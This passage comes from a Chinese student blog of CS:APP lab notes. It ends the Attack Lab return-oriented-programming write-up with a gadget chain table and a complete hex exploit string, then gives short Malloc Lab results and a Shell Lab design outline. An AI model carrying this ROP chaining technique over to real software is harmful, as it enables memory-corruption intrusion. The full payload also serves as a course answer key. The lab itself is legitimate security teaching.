+<p>这个过程不会是一下子完成的。我们先考虑最后一步，一定是<code>popq</code>之后做一些可能没用的操作，然后<code>ret</code>。可以这样做的情况包括：</p>
+<table>
+<thead>
+<tr class="header">
+<th>函数</th>
+<th>指令</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>addval_219</code></td>
+<td><code>pop %rax</code></td>
+</tr>
+<tr class="even">
+<td><code>addval_280</code></td>
+<td><code>pop %rax</code></td>
+</tr>
+<tr class="odd">
+<td><code>getval_481</code></td>
+<td><code>pop %rsp; movl %eax,%edx</code></td>
+</tr>
+</tbody>
+</table>
+<p>好像没什么有意义的。再看看<code>mov %rsp, ???</code>的指令：</p>
+<table>
+<thead>
+<tr class="header">
+<th>函数</th>
+<th>指令</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>addval_190</code></td>
+<td><code>movq %rsp, %rax</code></td>
+</tr>
+<tr class="even">
+<td><code>addval_110</code></td>
+<td><code>movl %esp, %eax</code></td>
+</tr>
+<tr class="odd">
+<td><code>setval_181</code></td>
+<td><code>movl %esp, %eax</code></td>
+</tr>
+<tr class="even">
+<td><code>setval_350</code></td>
+<td><code>movq %rsp, %rax</code></td>
+</tr>
+</tbody>
+</table>
+<p>再考虑出现过那几个功能性nop的指令：</p>
+<table>
+<thead>
+<tr class="header">
+<th>函数</th>
+<th>指令</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>getval_311</code></td>
+<td><code>movl %edx, %ecx</code></td>
+</tr>
+<tr class="even">
+<td><code>addval_187</code></td>
+<td><code>movl %ecx, %esi</code></td>
+</tr>
+<tr class="odd">
+<td><code>getval_159</code></td>
+<td><code>movl %edx, %ecx</code></td>
+</tr>
+<tr class="even">
+<td><code>addval_487</code></td>
+<td><code>movl %eax, %edx</code></td>
+</tr>
+</tbody>
+</table>
+<p><em>好吧我承认我这里没思路了……</em></p>
+<p>上网看了一下答案，有一个重要的工具是<code>add_xy</code>里的<code>lea (%rdi,%rsi,1),%rax</code>。为此我们的思路为：</p>
+<ul>
+<li><code>%rsp -&gt; %rax -&gt; %rdi</code>，得到一个栈上的地址；</li>
+<li><code>pop %rax(%eax) -&gt; %edx -&gt; %ecx -&gt; %esi(%rsi)</code>，从栈上获得一个偏移量；</li>
+<li><code>%rdi+%rsi -&gt; %rax -&gt; %rdi</code>，此时加起来的值要恰好指向我们在栈上的字符串地址。</li>
+</ul>
+<p>所以序列为：</p>
+<table>
+<thead>
+<tr class="header">
+<th>指令</th>
+<th>起始地址</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>movq %rsp, %rax</code></td>
+<td><code>0x401a06</code></td>
+</tr>
+<tr class="even">
+<td><code>movq %rax, %rdi</code></td>
+<td><code>0x4019a2</code></td>
+</tr>
+<tr class="odd">
+<td><code>popq %rax</code></td>
+<td><code>0x4019cc</code></td>
+</tr>
+<tr class="even">
+<td><code>movl %eax, %edx</code></td>
+<td><code>0x401a42</code></td>
+</tr>
+<tr class="odd">
+<td><code>movl %edx, %ecx</code></td>
+<td><code>0x401a34</code></td>
+</tr>
+<tr class="even">
+<td><code>movl %ecx, %esi</code></td>
+<td><code>0x401a27</code></td>
+</tr>
+<tr class="odd">
+<td><code>lea (%rdi, %rsi, 1), %rax</code></td>
+<td><code>0x4019d6</code></td>
+</tr>
+<tr class="even">
+<td><code>movq %rax, %rdi</code></td>
+<td><code>0x4019a2</code></td>
+</tr>
+<tr class="odd">
+<td><code>touch3...</code></td>
+<td><code>0x4018fa</code></td>
+</tr>
+</tbody>
+</table>
+<p>在<code>0x4018fa</code>的后面放置字符串。获取到的rsp恰好是第二个地址的位置，中间相隔8个地址和1个偏移量，所以偏移量等于9*8=72=0x48。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line">20 20 20 20</span><br><span class="line"></span><br><span class="line">06 1a 40 00</span><br><span class="line">00 00 00 00</span><br><span class="line">a2 19 40 00</span><br><span class="line">00 00 00 00</span><br><span class="line">cc 19 40 00</span><br><span class="line">00 00 00 00</span><br><span class="line"></span><br><span class="line">48 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line"></span><br><span class="line">42 1a 40 00</span><br><span class="line">00 00 00 00</span><br><span class="line">34 1a 40 00</span><br><span class="line">00 00 00 00</span><br><span class="line">27 1a 40 00</span><br><span class="line">00 00 00 00</span><br><span class="line">d6 19 40 00</span><br><span class="line">00 00 00 00</span><br><span class="line">a2 19 40 00</span><br><span class="line">00 00 00 00</span><br><span class="line">fa 18 40 00</span><br><span class="line">00 00 00 00</span><br><span class="line"></span><br><span class="line">35 39 62 39</span><br><span class="line">39 37 66 61</span><br><span class="line">00</span><br></pre></td></tr></table></figure>
+<h2 id="malloc-lab">Malloc Lab</h2>
+<p>按照指令，我们需要在<code>mm.c</code>里实现<code>mm_init</code> <code>mm_malloc</code> <code>mm_free</code> <code>mm_realloc</code>四个函数进行动态内存分配，而底层则是<code>memlib.c</code>里的<code>mem_sbrk</code>函数（这个函数可以扩大堆空间的范围）。</p>
+<p>没心思做太多优化，而且公开的压缩包里也只有两个小规模的数据集。所以我们参考CSAPP书上的内容，实现一个非常简单的首次分配算法的动态内存分配。</p>
+<ul>
+<li>首先实现基础设施，包括提取header的位置、计算长度、查看和设置是否已经被分配了；</li>
+<li><code>mm_malloc</code>遍历所有块，找到可用且空间足够的块，否则就申请新的内存；</li>
+<li><code>mm_free</code>不仅释放块，而且将它与后面的空闲块合并；</li>
+<li><code>mm_realloc</code>先将块与后面的空闲块合并；如果可以分裂，就将块分裂成两部分；否则就用<code>mm_malloc</code>申请一个新的。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">trace  valid  util     ops      secs  Kops</span><br><span class="line"> 0       yes   84%    5694  0.009977   571</span><br><span class="line"> 1       yes   87%    5848  0.008971   652</span><br><span class="line"> 2       yes   85%    6648  0.013163   505</span><br><span class="line"> 3       yes   87%    5380  0.009712   554</span><br><span class="line"> 4       yes   18%   14400  0.000251 57279</span><br><span class="line"> 5       yes   91%    4800  0.008327   576</span><br><span class="line"> 6       yes   88%    4800  0.007466   643</span><br><span class="line"> 7       yes   55%   12000  0.157215    76</span><br><span class="line"> 8       yes   51%   24000  0.297923    81</span><br><span class="line"> 9       yes   68%   14401  0.000227 63329</span><br><span class="line">10       yes    4%   14401  0.002923  4927</span><br><span class="line">Total          65%  112372  0.516155   218</span><br><span class="line"></span><br><span class="line">Perf index &#x3D; 39 (util) + 15 (thru) &#x3D; 54&#x2F;100</span><br></pre></td></tr></table></figure>
+<p>效果比较差，不管他了。</p>
+<h2 id="shell-lab">Shell Lab</h2>
+<p>我们主要要实现shell中的多任务功能。UNIX系统调用接口真够难用的，尤其是<code>waitpid</code>的机制、进程组的概念这两个地方。</p>
+<p>按照设计，我们需要依次完成以下几个函数：</p>
+<ul>
+<li><code>eval</code>：调用<code>parseline</code>解析命令行参数；分辨命令名，如果是内置命令（<code>quit</code> <code>jobs</code> <code>bg</code> <code>fg</code>）就调用<code>builtin_cmd</code>直接执行；否则：
+<ul>
+<li><code>fork</code></li>
+<li>用<code>setpgid</code>生成一个新的进程组ID（<strong>这一步是为了能够区分每个job的后代，每个job的第一个进程和后代进程共享一个进程组ID</strong>）</li>
+<li><code>execvp</code></li>
+<li>调用<code>addjob</code>添加任务，设置任务状态，并且：
+<ul>
+<li>如果前台执行，调用<code>waitfg</code>等待子进程执行完毕；</li>
+<li>如果后台执行，输出这个job的信息提示。</li>
+</ul></li>
+</ul></li>
+<li><code>builtin_cmd</code>：再分辨命令名，<code>quit</code>直接退出，<code>jobs</code>调用<code>listjobs</code>，否则调用<code>do_fgbg</code>；</li>
+<li><code>do_fgbg</code>：首先进行参数检查并得到要处理的job，然后和上面一样更新任务状态并<code>waitfg</code>或者输出信息；</li>
+<li><code>waitfg</code>：使用<code>waitpid</code>系统调用，<strong>阻塞式地等待</strong>前台进程<strong>所在进程组ID的所有进程</strong>阻塞或终止，然后根据进程的状态输出相应信息；</li>
+<li><code>sigchld_handler</code>：使用<code>waitpid</code>系统调用，<strong>非阻塞式地查询</strong>是否有任一子进程阻塞或终止，然后根据进程的状态输出相应信息；</li>
+<li><code>sigint_handler</code> <code>sigtstp_handler</code>：将相同信号用<code>kill</code>系统调用再次传给前台进程<strong>所在进程组ID的所有进程</strong>。</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/10/17/MIT6.830%E7%AC%94%E8%AE%B0/" rel="prev" title="MIT 6.830 学习笔记">
+      <i class="fa fa-chevron-left"></i> MIT 6.830 学习笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/03/21/%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8Bgithub-actions/" rel="next" title="测试一下github actions">
+      测试一下github actions <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#bomb-lab"><span class="nav-number">1.</span> <span class="nav-text">Bomb Lab</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phase_defused"><span class="nav-number">1.1.</span> <span class="nav-text">phase_defused</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#initialize_bomb"><span class="nav-number">1.2.</span> <span class="nav-text">initialize_bomb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase_1"><span class="nav-number">1.3.</span> <span class="nav-text">phase_1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase_2"><span class="nav-number">1.4.</span> <span class="nav-text">phase_2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase_3"><span class="nav-number">1.5.</span> <span class="nav-text">phase_3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase_4"><span class="nav-number">1.6.</span> <span class="nav-text">phase_4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase_5"><span class="nav-number">1.7.</span> <span class="nav-text">phase_5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase_6"><span class="nav-number">1.8.</span> <span class="nav-text">phase_6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%99%84%E5%8A%A0%E5%85%B3"><span class="nav-number">1.9.</span> <span class="nav-text">附加关</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#attack-lab"><span class="nav-number">2.</span> <span class="nav-text">Attack Lab</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.</span> <span class="nav-text">代码注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#level-1"><span class="nav-number">2.1.1.</span> <span class="nav-text">Level 1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-2"><span class="nav-number">2.1.2.</span> <span class="nav-text">Level 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-3"><span class="nav-number">2.1.3.</span> <span class="nav-text">Level 3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%A2%E5%90%91%E8%BF%94%E5%9B%9E%E6%94%BB%E5%87%BB"><span class="nav-number">2.2.</span> <span class="nav-text">面向返回攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#level-2-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">Level 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-3-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">Level 3</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#malloc-lab"><span class="nav-number">3.</span> <span class="nav-text">Malloc Lab</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shell-lab"><span class="nav-number">4.</span> <span class="nav-text">Shell Lab</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">PeriodicLaw</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">PeriodicLaw</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
